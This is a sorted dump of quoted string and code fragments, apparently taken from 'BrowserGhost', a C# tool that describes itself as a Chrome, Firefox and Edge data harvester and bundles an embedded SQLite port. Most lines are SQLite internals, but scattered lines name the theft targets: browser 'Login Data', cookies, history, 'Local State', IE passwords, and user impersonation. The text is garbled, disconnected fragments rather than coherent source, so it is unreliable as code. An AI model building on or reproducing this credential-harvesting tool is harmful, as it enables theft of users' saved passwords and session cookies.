"0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"0, 0, 1, 2, 3, 0, 1, 2, 0, 0, 2, 2, 4, 5, 5, 0,"
"0, b1 is iBMem"
"0, sqlite3ExprDup(db, pRight, 0), 0)"
"000"" as a statement terminator in SQLite"
"000"" style exponentiation suffix."
"000"""
"000"", 4, SQLITE_STATIC)"
"000X0"""
"040"""
"0] = ""Name"""
"0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   /"
"0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  /"
"0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00,  /"
"0x00, 0x01, 0x02, 0x03, 0x00, 0x01, 0x00, 0x00,"
"0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,"
"0x00, 0x0a, 0x0a, 0x0a, 0x0a, 0x0a, 0x0a, 0x02,  /"
"0x00, 0x2a, 0x2a, 0x2a, 0x2a, 0x2a, 0x2a, 0x22,  /"
"0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  /"
"0x02, 0x02, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,  /"
"0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02,  /"
"0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,"
"0x0c, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  /"
"0x0c, 0x0c, 0x0c, 0x0c, 0x0c, 0x0c, 0x0c, 0x0c,  /"
"0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,"
"0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,"
"0x22, 0x22, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00,  /"
"0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,  /"
"0xd9, 0xd5, 0x05, 0xf9, 0x20, 0xa1, 0x63, 0xd7,"
"1), reg(P1"
"1),P4_INT32)"
"1). Using os_unix.c,"
"1,             /"
"1, 2, 6, 2, 3, 0, 1, 0, 2, 0, 2, 0, 0, 0, 0, 0,"
"1, and so forth)"
"1,(y)"
"1-nCursor)..nMem, inclusive, will never be used by"
"10""."
"104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,"
"108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,"
"11,   2,   7,   5,   5,   9,   6,   9,   9,   7,  10,  10,   4,"
"112, 81, 82, 83, 84, 85, 86, 87, 88, 89,122,123,124,125,126,127, /"
"116,   0, 114, 109,   0,  22,  87,   0,   9,   0,   0,  64,  65,"
"12,   6,   9,   4,   6,   5,   4,   7,   6,   5,   6,   7,   5,"
"122, 91, 92, 93, 94, 95, 96, 97, 98, 99,100,101,102,103,104,105,106,107,"
"126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,"
"128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143, /"
"144,145,146,147,148,149,150,151,152,153,154,155,156,157,156,159, /"
"144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,"
"16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, /"
"160,161,162,163,164,165,166,167,168,169,170,171,140,141,142,175, /"
"162, 162, 165, 167, 167, 171, 176, 179, 184, 189, 194, 197, 203,"
"162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,"
"176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191, /"
"18) "" "
"18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35,"
"180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,"
"192,129,130,131,132,133,134,135,136,137,202,203,204,205,206,207, /"
"198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,"
"1:(assert(0),0))"
"1:0), iReg"
"1:0, seekResult"
"1:0,"
"1:sqlite3GetVarint32(A,B))"
"1] = ""Age"""
"1], 0, 4)"
"2) insertion sort algorithm is used, but since"
"2), ....  There are P2 tables"
"2,   2,   6,   5,   8,   5,   5,   8,   3,   5,   5,   6,   4,"
"2, iReg, pVTab, P4_VTAB)"
"2, regIns, pVTab, P4_VTAB)"
"202:  If db.magic is not a valid open value, take care not"
"206, 210, 217, 223, 223, 226, 229, 233, 234, 238, 244, 248, 255,"
"208,145,146,147,148,149,150,151,152,153,218,219,220,221,222,223, /"
"20], 0,"
"216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,"
"224,225,162,163,164,165,166,167,168,169,232,203,204,205,206,207, /"
"234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,"
"239,240,241,242,243,244,245,246,247,248,249,219,220,221,222,255, /"
"252,253,254,255"
"26,  /"
"261, 273, 279, 288, 290, 296, 301, 303, 310, 315, 320, 326, 332,"
"28,   0,  80,  53,  58,   0,  20,  56,   0,  51,"
"2804:  When we open a database in the newer file format,"
"2] = ""Alice"""
"3 AS a, y"
"3"" and every place we see ""b"" we substitute ""y"
"31 distinct pages in a database,"
"32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, /"
"337, 341, 344, 350, 354, 361, 363, 370, 372, 374, 383, 387, 393,"
"36,  41,  46,  48,  53,  54,  59,  62,  65,  67,  69,  78,  81,"
"36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53,"
"38, 102,   0,  75,   0,  18,  83, 105,  31,   0, 115,  74, 107,"
"3883.  Either way, assume that the journal is hot."
"399, 407, 412, 412, 428, 435, 442, 443, 450, 454, 458, 462, 466,"
"3] = ""43"""
"4,   5,   6,   5,   7,   3,   7,  13,   2,   2,   4,   6,   6,"
"41,  12,  72,  15,   0, 111,  79,  49, 106,   0,  19,   0,   0,"
"469, 471, 473, 479, 483, 491, 495, 500, 508, 511, 516, 521, 527,"
"48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, /"
"4] = ""Bob"""
"5,   7,   7,   7,   3,   4,   4,   7,   3,   6,   4,   7,   6,"
"5, b"
"531, 536,"
"54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 97, 98, 99,100,101,102,103,"
"57,  45,  78,   0,   0,  88,  39,   0, 110,   0,  35,   0,   0,"
"5] = ""28"""
"6,   2,   3,   4,   9,   2,   6,   5,   6,   6,   5,   6,   5,"
"63:  9223372036854775808.  Return negative, zero, or positive"
"64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, /"
"6] = ""Cindy"""
"7,   7,   3,   8,   2,   6,   5,   4,   4,   3,  10,   4,   6,"
"7,   7,   5,   4,   6,   4,   5,   3,   6,   7,   3,   6,   6,"
"70,  99, 112,  68,   0,  43,   0,   0,  76,   0,  71,   0,   0,"
"7] = ""21"""
"8,   5,  17,  12,   7,   8,   8,   2,   4,   4,   4,   4,   4,"
"80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, /"
"81,   0,  69,   0,   0, 108,  27,  36,  67,  77,   0,  34,  62,"
"86,  95,  96, 101, 105, 109, 117, 122, 128, 136, 142, 152, 159,"
"9,   3,"
"90,   0,   0, 119, 100,  55, 118,  52,   7,  50,   0,  85,   0,"
"94,  26,   0,  93,   0,   0,   0,  89,  86,  91,  82, 103,  14,"
"96, 97, 66, 67, 68, 69, 70, 71, 72, 73,106,107,108,109,110,111, /"
": ""=r"" (retval), ""=r"" (junk))"
"<Project DefaultTargets=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"" ToolsVersion=""15.0"">"
"<startup><supportedRuntime version=""v2.0.50727""/></startup></configuration>"
"= (int)putVarint(pCell, nHeader, (int)(nData "
"= (int)sqlite3VdbeSerialGet( aKey, d, serial_type, pMem )"
"= (int)sqlite3VdbeSerialGet( aKey1, d1, serial_type1, mem1 )"
"= (int)sqlite3VdbeSerialPut( zNewRecord, i, (int)nByte - i, pRec, file_format )"
"= (u16)getVarint(pCell, iCell "
"= (u16)getVarint32(pCell, iCell "
"= (u32)getVarint32( aKey, idx, ref serial_type )"
"= addToSavepointBitvecs( pPager, pPg.pgno )"
"= dupedExprNodeSize( p, flags )"
"= dupedExprSize( p.pLeft, flags ) "
"= exprListTableUsage( pMaskSet, p.x.pList )"
"= exprListTableUsage( pMaskSet, pS.pEList )"
"= exprListTableUsage( pMaskSet, pS.pGroupBy )"
"= exprListTableUsage( pMaskSet, pS.pOrderBy )"
"= exprSelectTableUsage( pMaskSet, p.x.pSelect )"
"= exprTableUsage( pMaskSet, p.pLeft )"
"= exprTableUsage( pMaskSet, pList.a[i].pExpr )"
"= exprTableUsage( pMaskSet, pS.pHaving )"
"= exprTableUsage( pMaskSet, pS.pWhere )"
"= getMask( pMaskSet, pAndTerm.leftCursor )"
"= getMask( pMaskSet, pOther.leftCursor )"
"= getVarint32( pIter, ref nSize )"
"= getVarint32( zData, zIdx, ref aType[i] )"
"= getVarint32(pCell, _pIter, ref nSize)"
"= getVarint32(pCell, ref nSize)"
"= getVarint32(pPage.aData, pCell, ref Dummy0)"
"= putVarint(pCell, nHeader, (u64)nKey)"
"= putVarint32( zNewRecord, i, (int)serial_type )"
"= sqlite3BitvecSet( p, aiValues[j] )"
"= sqlite3BitvecSet( p.pInSavepoint, pgno )"
"= sqlite3DbMallocSize(pMem.db, pMem.z)"
"AGGREGATE(""avg"",               1, 0, 0, sumStep,         avgFinalize    ),"
"AGGREGATE(""count"",             0, 0, 0, countStep,       countFinalize  ), "
"AGGREGATE(""count"",             1, 0, 0, countStep,       countFinalize  ),"
"AGGREGATE(""group_concat"",      1, 0, 0, groupConcatStep, groupConcatFinalize),"
"AGGREGATE(""group_concat"",      2, 0, 0, groupConcatStep, groupConcatFinalize),"
"AGGREGATE(""max"",               1, 1, 1, minmaxStep,      minMaxFinalize ),"
"AGGREGATE(""min"",               1, 0, 1, minmaxStep,      minMaxFinalize ),"
"AGGREGATE(""sum"",               1, 0, 0, sumStep,         sumFinalize    ),"
"AGGREGATE(""total"",             1, 0, 0, sumStep,         totalFinalize    ),"
"AnyCPU' "">"
"Array.Resize( ref pParse.aTableLock, pParse.nTableLock "
"Array.Resize(ref res.azResult, res.nData-1)"
"AssemblyInfo.cs"" />"
"BLOB"","
"BTREE_DEFAULT_CACHE_SIZE, 0,  /"
"BTREE_SCHEMA_VERSION,     1,  /"
"BTREE_TEXT_ENCODING,      0,  /"
"BTREE_USER_VERSION,       0,  /"
"Bitmask notReady,               /"
"Bitmask prereqColumn, prereqExpr"
"Bookmarks"""
"Btree pBtree,          /"
"Btree pBtree,         /"
"CODEC1( pPager, aData, pgno, 0, rc = SQLITE_NOMEM )"
"CODEC1( pPager, aData, pgno, 3, rc = SQLITE_NOMEM )"
"CODEC1(pPager, pData, pPg.pgno, 3, rc=SQLITE_NOMEM)"
"CODEC1(pPager, pPg.pData, pPg.pgno, 3, rc = SQLITE_NOMEM)"
"Cookies"""
"DWORD dwFileOffsetHigh,"
"DWORD dwFileOffsetLow,"
"DWORD dwFlags,"
"DWORD dwReserved,"
"DWORD nNumberOfBytesToLockHigh,"
"DWORD nNumberOfBytesToLockLow,"
"DWORD nNumberOfBytesToUnlockLow,"
"Debug.Assert( !hasReadConflicts(pCsr.pBtree, pCsr.pgnoRoot) )"
"Debug.Assert( SQLITE_OK==querySharedCacheTableLock(p, iTable, eLock) )"
"Debug.Assert( hasSharedCacheTableLock(pCsr.pBtree, pCsr.pgnoRoot, 0, 2) )"
"Debug.Assert( sqlite3GetVTable(pParse.db, pTab) )"
"END"" of the """
"Encoding.Unicode.GetBytes( pMem.z, 0, 1,b01,0 )"
"Expr pLimit,                /"
"Expr pOffset,               /"
"Expr pRight, pLeft"
"Expr pRowid,        /"
"Expr pWhere,                /"
"ExprList pChanges,  /"
"ExprList pOrderBy,          /"
"FILETIME uTm, lTm"
"FILE_MAP_WRITE, 0, 0, winceLock).Length"
"FLOAT"","
"FUNCTION(""abs"",                1, 0, 0, absFunc          ),"
"FUNCTION(""changes"",            0, 0, 0, changes          ),"
"FUNCTION(""coalesce"",           0, 0, 0, null                ),"
"FUNCTION(""coalesce"",           1, 0, 0, null                ),"
"FUNCTION(""coalesce"",          -1, 0, 0, ifnullFunc       ),"
"FUNCTION(""current_date"",      0, 0, 0, (dxFunc)cdateFunc     ),"
"FUNCTION(""current_time"",      0, 0, 0, (dxFunc)ctimeFunc     ),"
"FUNCTION(""current_timestamp"", 0, 0, 0, (dxFunc)ctimestampFunc),"
"FUNCTION(""date"",             -1, 0, 0, (dxFunc)dateFunc      ),"
"FUNCTION(""datetime"",         -1, 0, 0, (dxFunc)datetimeFunc  ),"
"FUNCTION(""hex"",                1, 0, 0, hexFunc          ),"
"FUNCTION(""ifnull"",             2, 0, 1, ifnullFunc       ),"
"FUNCTION(""julianday"",        -1, 0, 0, (dxFunc)juliandayFunc ),"
"FUNCTION(""last_insert_rowid"",  0, 0, 0, last_insert_rowid),"
"FUNCTION(""length"",             1, 0, 0, lengthFunc       ),"
"FUNCTION(""load_extension"",     1, 0, 0, loadExt          ),"
"FUNCTION(""load_extension"",     2, 0, 0, loadExt          ),"
"FUNCTION(""lower"",              1, 0, 0, lowerFunc        ),"
"FUNCTION(""ltrim"",              1, 1, 0, trimFunc         ),"
"FUNCTION(""ltrim"",              2, 1, 0, trimFunc         ),"
"FUNCTION(""max"",                0, 1, 1, null                ),"
"FUNCTION(""max"",               -1, 1, 1, minmaxFunc       ),"
"FUNCTION(""min"",                0, 0, 1, null                ),"
"FUNCTION(""min"",               -1, 0, 1, minmaxFunc       ),"
"FUNCTION(""nullif"",             2, 0, 1, nullifFunc       ),"
"FUNCTION(""quote"",              1, 0, 0, quoteFunc        ),"
"FUNCTION(""random"",             0, 0, 0, randomFunc       ),"
"FUNCTION(""randomblob"",         1, 0, 0, randomBlob       ),"
"FUNCTION(""replace"",            3, 0, 0, replaceFunc      ),"
"FUNCTION(""round"",              1, 0, 0, roundFunc        ),"
"FUNCTION(""round"",              2, 0, 0, roundFunc        ),"
"FUNCTION(""rtrim"",              1, 2, 0, trimFunc         ),"
"FUNCTION(""rtrim"",              2, 2, 0, trimFunc         ),"
"FUNCTION(""soundex"",            1, 0, 0, soundexFunc      ),"
"FUNCTION(""sqlite_version"",     0, 0, 0, versionFunc      ),"
"FUNCTION(""strftime"",         -1, 0, 0, (dxFunc)strftimeFunc  ),"
"FUNCTION(""substr"",             2, 0, 0, substrFunc       ),"
"FUNCTION(""substr"",             3, 0, 0, substrFunc       ),"
"FUNCTION(""time"",             -1, 0, 0, (dxFunc)timeFunc      ),"
"FUNCTION(""total_changes"",      0, 0, 0, total_changes    ),"
"FUNCTION(""trim"",               1, 3, 0, trimFunc         ),"
"FUNCTION(""trim"",               2, 3, 0, trimFunc         ),"
"FUNCTION(""typeof"",             1, 0, 0, typeofFunc       ),"
"FUNCTION(""upper"",              1, 0, 0, upperFunc        ),"
"FUNCTION(""zeroblob"",           1, 0, 0, zeroblobFunc     ),"
"FuncDefHash pHash = GLOBAL( FuncDefHash, sqlite3GlobalFunctions )"
"FuncDef[] aFunc = (FuncDef)GLOBAL( FuncDef, aDateTimeFuncs )"
"FuncDef[] aFunc = (FuncDef[])GLOBAL( FuncDef, aBuiltinFunc )"
"GLOBAL(BenignMallocHooks,sqlite3Hooks)"
"GLOBAL(FuncDefHash, sqlite3GlobalFunctions)"
"GLOBAL(sqlite3AutoExtList,sqlite3Autoext)"
"GLOBAL(sqlite3StatType,sqlite3Stat)"
"GLOBAL(struct sqlite3PrngType, sqlite3Prng)"
"GLOBAL(struct sqlite3PrngType, sqlite3Prng),"
"GLOBAL(struct sqlite3PrngType, sqlite3SavedPrng),"
"HANDLE phFile,"
"History"""
"INSERT"","
"INTERSECT"","
"Inf"""
"Inf"".ToCharArray()"
"JOIN"","
"JOURNAL_HDR_SZ(pPager)==pPager.journalOff"""
"JT_CROSS         ),"
"JT_OUTER          ),"
"JT_OUTER         ),"
"JT_OUTER ),"
"K, int L)"
"LE expr"","
"LIKEFUNC(""glob"", 2, globInfo, SQLITE_FUNC_LIKE"
"LIKEFUNC(""like"", 2, likeInfoAlt, SQLITE_FUNC_LIKE"
"LIKEFUNC(""like"", 2, likeInfoNorm, SQLITE_FUNC_LIKE),"
"LIKEFUNC(""like"", 3, likeInfoAlt, SQLITE_FUNC_LIKE"
"LIKEFUNC(""like"", 3, likeInfoNorm, SQLITE_FUNC_LIKE),"
"Local State"""
"Login Data"""
"MINUS expr"","
"Microsoft Visual Studio Solution File, Format Version 12.00"
"Microsoft.CSharp.targets"" />"
"NE expr"","
"NNN are used,"
"NNN"" in the SQL is a special constant that means whatever value"
"NNN"" or "":AAA"" or ""@AAA"" or ""$AAA"""
"NNN"" parameters is the value of NNN."
"NNN"", "":AAA"", ""$AAA"", or ""@AAA"" that serve as"
"NNN, this will correspond to the"
"NOTNULL"","
"OFFSET"" )"
"OP_IdxGE,            /"
"OP_Last,             /"
"OP_Noop,             /"
"OP_Rewind,           /"
"OP_SeekGe,           /"
"OP_SeekGt,           /"
"OP_SeekLt,           /"
"P3-1) (""B"").  Save the result of"
"PAGE_READWRITE, 0, winceLock.Length,"
"Parse pParse,               /"
"Parse pParse,       /"
"Parse pParse,     /"
"Pgno child = sqlite3Get4byte(pPage.aData,pPage.hdrOffset"
"Pgno iRoot,            /"
"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""BrowserGhost"", ""BrowserGhost.csproj"", ""{F1653F20-D47D-4F29-8C55-3C835542AF5F}"""
"READ_UTF16BE(z, c)"
"READ_UTF16LE(z, c)"
"REGISTER_TRACE(pOp.p1, pName)"
"REGISTER_TRACE(pOp.p3, pDest)"
"REGISTER_TRACE(pOp.p3, pQuery)"
"REM expr"","
"RSHIFT expr"","
"SQLITE_FUNC_CASE),"
"SQLITE_FUNC_NEEDCOLL, "
"SQLITE_MAX_ATTACHED,"
"SQLITE_MAX_COLUMN,"
"SQLITE_MAX_COMPOUND_SELECT,"
"SQLITE_MAX_EXPR_DEPTH,"
"SQLITE_MAX_FUNCTION_ARG,"
"SQLITE_MAX_LENGTH,"
"SQLITE_MAX_LIKE_PATTERN_LENGTH,"
"SQLITE_MAX_SQL_LENGTH,"
"SQLITE_MAX_VARIABLE_NUMBER,"
"SQLITE_MAX_VDBE_OP,"
"SQLITE_OPEN_READWRITE ), ref pOutFlags )"
"SQLITE_RecoveryMode ),"
"SQLITE_UTF8, SQLITE_STATIC)"
"STRING"","
"STR_FUNCTION(""current_date"",      0, ""%Y-%m-%d %H:%M:%S"", 0, currentTimeFunc),"
"STR_FUNCTION(""current_time"",      0, ""%H:%M:%S"",          0, currentTimeFunc),"
"STR_FUNCTION(""current_timestamp"", 0, ""%Y-%m-%d"",          0, currentTimeFunc),"
"Select sqlite3SelectDup(sqlite3 db, Select p, int flags){"
"SrcList pSrc,               /"
"SrcList pSrc,       /"
"TK_ADD,        TK_DATABASE,   TK_AS,         TK_SELECT,     TK_TABLE,"
"TK_ASC,        TK_DELETE,     TK_CASE,       TK_COLLATE,    TK_CREATE,"
"TK_AUTOINCR,   TK_TO,         TK_IN,         TK_CAST,       TK_COLUMNKW,"
"TK_COMMIT,     TK_CONFLICT,   TK_JOIN_KW,    TK_CTIME_KW,   TK_CTIME_KW,"
"TK_CTIME_KW,   TK_DETACH,     TK_IMMEDIATE,  TK_JOIN,       TK_INSERT,"
"TK_EACH,       TK_CHECK,      TK_KEY,        TK_BEFORE,     TK_FOREIGN,"
"TK_EXCEPT,     TK_TRANSACTION,TK_ON,         TK_JOIN_KW,    TK_ALTER,"
"TK_FAIL,       TK_FROM,       TK_JOIN_KW,    TK_LIKE_KW,    TK_BY,"
"TK_FOR,        TK_IGNORE,     TK_LIKE_KW,    TK_EXPLAIN,    TK_INSTEAD,"
"TK_IF,         TK_ISNULL,     TK_ORDER,      TK_RESTRICT,   TK_JOIN_KW,"
"TK_JOIN_KW,    TK_ROLLBACK,   TK_ROW,        TK_UNION,      TK_USING,"
"TK_JOIN_KW,    TK_THEN,       TK_END,        TK_DEFERRABLE, TK_ELSE,"
"TK_MATCH,      TK_PLAN,       TK_ANALYZE,    TK_PRAGMA,     TK_ABORT,"
"TK_NOTNULL,    TK_NOT,        TK_NULL,       TK_LIKE_KW,    TK_CASCADE,"
"TK_OF,         TK_SET,        TK_TEMP,       TK_TEMP,       TK_OR,"
"TK_PRIMARY,    TK_DEFERRED,   TK_DISTINCT,   TK_IS,         TK_DROP,"
"TK_RAISE,      TK_EXCLUSIVE,  TK_EXISTS,     TK_SAVEPOINT,  TK_INTERSECT,"
"TK_REINDEX,    TK_INDEXED,    TK_INDEX,      TK_DESC,       TK_ESCAPE,"
"TK_RENAME,     TK_AFTER,      TK_REPLACE,    TK_AND,        TK_DEFAULT,"
"TK_TRIGGER,    TK_REFERENCES, TK_CONSTRAINT, TK_INTO,       TK_OFFSET,"
"TK_UNIQUE,     TK_QUERY,      TK_ATTACH,     TK_HAVING,     TK_GROUP,"
"TK_UPDATE,     TK_BEGIN,      TK_JOIN_KW,    TK_RELEASE,    TK_BETWEEN,"
"TK_VACUUM,     TK_VIEW,       TK_INITIALLY,  TK_ALL,"
"TK_VALUES,     TK_VIRTUAL,    TK_LIMIT,      TK_WHEN,       TK_WHERE,"
"TRACE(""BALANCE: begin page %d child of %d"
"Table pTab,         /"
"TypedURLs"")"
"WHERETRACE(""Recomputing index info for %s..."
"WHERETRACE(""xBestIndex for %s"
"WRITE_UTF16BE(z, i)"
"WRITE_UTF16LE(z, i)"
"WRITE_UTF8(z, i)"
"Z, int N, int iOffset)"
"ZeroMemory(pFile.local, pFile.local).Length"
"ZeroMemory(pFile.shared, winceLock).Length"
"[assembly: AssemblyCompany("""")]"
"[assembly: AssemblyConfiguration("""")]"
"[assembly: AssemblyCopyright("""")]"
"[assembly: AssemblyCulture("""")]"
"[assembly: AssemblyDescription(""BrowserGhost is a Chrome, Firefox and Edge data harvestor."")]"
"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
"[assembly: AssemblyProduct("""")]"
"[assembly: AssemblyTitle(""BrowserGhost"")]"
"[assembly: AssemblyTrademark("""")]"
"[assembly: AssemblyVersion( ""3.6.17.1"" )]"
"[assembly: Guid(""2133c634-4139-466e-8983-9a23ec99e01b"")]"
"] = '""'"
"] = ','"
"] = (char)( et_getdigit( ref realvalue, ref nsd ) "
"] Copy {0} to {1}"", chrome_History_path, cookie_tempFile)"
"] Copy {0} to {1}"", chrome_cookie_path, cookie_tempFile)"
"] Copy {0} to {1}"", login_data_path, login_data_tempFile)"
"] Current user {0}"", Environment.UserName)"
"] Delete File {0}"", cookie_tempFile)"
"] Delete File {0}"", login_data_tempFile)"
"] Impersonate user {0}"", Environment.UserName)"
"] Recvtoself"")"
"] [{0}] [{1}] [{2}]"", pid, processname, process_of_user)"
"]Get Chrome Bookmarks"")"
"]Get Chrome Cookie"")"
"]Get Chrome History"")"
"]Get Chrome Login Data"")"
"]Get IE Books"")"
"]Get IE History"")"
"]Get IE Password"")"
"]xyz        Matches ""abc"
"__asm__ __volatile__ ("""
"__asm__ __volatile__ (""rdtsc"" : ""=A"" (val))"
"__asm__ __volatile__ (""rdtsc"" : ""=a"" (lo), ""=d"" (hi))"
"a, b, c, d, e)"
"a, b, c, d, e, f)"
"aNew[nCurrent], 0, (nSavepoint-nCurrent) "
"aRoot, int nRoot, int, int"
"aVTrans[db->nVTrans], 0, sizeof(sqlite3_vtab "
"addToSavepointBitvecs(pPager, pgno)"
"addr = sqlite3VdbeAddOp2(v, OP_Rewind, ephemTab, 0)"
"amt"" is larger than"
"apArg, int nArg),    /"
"apPage, int nPage){"
"argv,"
"auth = sqlite3AuthCheck(pParse, SQLITE_FUNCTION, 0, pDef.zName, 0)"
"b AS x, c"
"b"" in the example) and return immediately."
"b"" to render:"
"b, 0, sizeof( b ) )"
"bestOrClauseIndex(pParse, pWC, pSrc, notReady, pOrderBy, pCost)"
"bestPlan, 0, sizeof( bestPlan ) )"
"bestVirtualIndex(pParse, pWC, pSrc, notReady, pOrderBy, pCost, p)"
"bestVirtualIndex(pParse, pWC, pTabItem, notReady, pOrderBy, "
"bne     1b"""
"bool saveSqlFlag,         /"
"btreeParseCellPtr(pPage, z,  info)"
"buf[pMem.n], 0, len - pMem.n )"
"byte az[] = { ""BEGIN"", ""RELEASE"", ""ROLLBACK"" }"
"c = sqlite3Utf8Read(z, (const u8"
"c1, 0, sizeof( c1 ) )"
"c2, 0, sizeof( c2 ) )"
"checkAppendMsg(sCheck, 0, ""Page %d is never used"", i)"
"cmpw    %0,%1"
"contentOffset, 0, usableSize-contentOffset)"
"context,"
"ctx, 0, sizeof(ctx))"
"ctx.s, sizeof(ctx.s))"
"cygwin_conv_to_full_win32_path(zRelative, zFull)"
"data[24], 0, 100-24)"
"data[cellbody], apCell[i], aSize[i])"
"db,                    /"
"db,                   /"
"db,                /"
"db,               /"
"db,            /"
"db,          /"
"db,    /"
"db, "
"db, Table "
"db, VTable "
"db, char "
"db, const char "
"db, int N)"
"db, int iDb, const char "
"db, int offset){"
"db, int onoff)"
"db, sqlite3 "
"db->aModule, zCopy, nName, (void"
"db->aModule, zMod, sqlite3Strlen30(zMod))"
"db.xCollNeeded16( db.pCollNeededArg, db, db.aDbStatic[0].pSchema.enc, zExternal )"
"debugMutexAlloc,"
"debugMutexEnd,"
"debugMutexEnter,"
"debugMutexFree,"
"debugMutexHeld,"
"debugMutexInit,"
"debugMutexLeave,"
"debugMutexTry,"
"define AGGREGATE(zName, nArg, arg, nc, xStep, xFinal) "
"define CLEARBIT(V,I)    V[I>>3] "
"define DbClearProperty(D,I,P)   (D)->aDb[I].pSchema->flags"
"define DbHasAnyProperty(D,I,P)  (((D)->aDb[I].pSchema->flags"
"define DbHasProperty(D,I,P)     (((D)->aDb[I].pSchema->flags"
"define DbSetProperty(D,I,P)     (D)->aDb[I].pSchema->flags"
"define EXPR_REDUCEDSIZE        offsetof(Expr,iTable)  /"
"define EXPR_TOKENONLYSIZE      offsetof(Expr,pLeft)   /"
"define ExprClearProperty(E,P)   (E)->flags"
"define ExprHasAnyProperty(E,P)  (((E)->flags"
"define ExprHasProperty(E,P)     (((E)->flags"
"define ExprSetProperty(E,P)     (E)->flags"
"define FUNCTION(zName, nArg, iArg, bNC, xFunc) "
"define GLOBAL(t,v) ("
"define GLOBAL(t,v) v"
"define GetTempPathA(a,b)"
"define LIKEFUNC(zName, nArg, arg, flags) "
"define LockFile(a,b,c,d,e)       winceLockFile("
"define LockFileEx(a,b,c,d,e,f)   winceLockFileEx("
"define MASTER_NAME       ""sqlite_master"""
"define MemSetTypeFlag(p, f) "
"define OSTRACE2(X,Y)"
"define OSTRACE3(X,Y,Z)"
"define OSTRACE4(X,Y,Z,A)"
"define OSTRACE5(X,Y,Z,A,B)"
"define OSTRACE6(X,Y,Z,A,B,C)"
"define OSTRACE7(X,Y,Z,A,B,C,D)"
"define PAGE_TO_PGHDR1(c, p) (PgHdr1"
"define PTRMAP_ISPAGE(pBt, pgno) (PTRMAP_PAGENO((pBt),(pgno))==(pgno))"
"define PTRMAP_PAGENO(pBt, pgno) ptrmapPageno(pBt, pgno)"
"define PTRMAP_PTROFFSET(pgptrmap, pgno) (5"
"define READ_UTF16BE(zIn, c){                                         "
"define READ_UTF16LE(zIn, c){                                         "
"define READ_UTF8(zIn, zTerm, c)                           "
"define SETBIT(V,I)      V[I>>3] "
"define SQLITE_VERSION         ""3.6.17"""
"define STRICMP(x, y) ("
"define STR_FUNCTION(zName, nArg, pArg, bNC, xFunc) "
"define SWAP(TYPE,A,B) {TYPE t=A"
"define Stringify(P, enc) "
"define TEMP_MASTER_NAME  ""sqlite_temp_master"""
"define TESTBIT(V,I)     (V[I>>3]"
"define UNUSED_PARAMETER2(x,y) UNUSED_PARAMETER(x),UNUSED_PARAMETER(y)"
"define UnlockFile(a,b,c,d,e)     winceUnlockFile("
"define WRITE_UTF16BE(zOut, c) {                                    "
"define WRITE_UTF16LE(zOut, c) {                                    "
"define WRITE_UTF8(zOut, c) {                          "
"define findCell(P,I) "
"define getVarint32(A,B)  (u8)(("
"define hasReadConflicts(a, b) 0"
"define hasSharedCacheTableLock(a,b,c,d) 1"
"define initMaskSet(P)  memset(P, 0, sizeof("
"define invalidateIncrblobCursors(x,y,z)"
"define isLookaside(A,B) 0"
"define mem0 GLOBAL(struct Mem0Global, mem0)"
"define offsetof(STRUCTURE,FIELD) ((int)((char"
"define pager_datahash(X,Y)  0"
"define parseCell(pPage, iCell, pInfo) "
"define pcache1 (GLOBAL(struct PCacheGlobal, pcache1_g))"
"define ptrmapGet(w,x,y,z) SQLITE_OK"
"define ptrmapPut(w,x,y,z,rc)"
"define ptrmapPutOvflPtr(x, y, rc)"
"define put2byte(p,v) ((p)[0] = (u8)((v)>>8), (p)[1] = (u8)(v))"
"define put32bits(A,B)  sqlite3sqlite3Put4byte((u8"
"define putVarint32(A,B)  (u8)(((u32)(B)<(u32)0x80) "
"define querySharedCacheTableLock(a,b,c) SQLITE_OK"
"define setSharedCacheTableLock(a,b,c) SQLITE_OK"
"define sqlite3ConnectionBlocked(x,y)"
"define sqlite3ExprCheckHeight(x,y)"
"define sqlite3ExprSetHeight(x,y)"
"define sqlite3GlobalConfig GLOBAL(struct Sqlite3Config, sqlite3Config)"
"define sqlite3PagerGet(A,B,C) sqlite3PagerAcquire(A,B,C,0)"
"define sqlite3ParserARG_PDECL ,Parse pParse"
